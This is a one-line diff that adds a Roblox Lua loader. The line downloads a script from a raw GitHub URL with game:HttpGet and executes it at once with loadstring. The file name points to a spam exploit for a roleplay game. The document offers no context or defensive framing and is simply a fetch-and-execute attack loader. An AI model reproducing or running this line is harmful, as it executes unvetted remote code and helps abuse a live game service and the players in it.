@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/lifetogether-rp-spam3-oijj2zexjdltxy.lua"))()
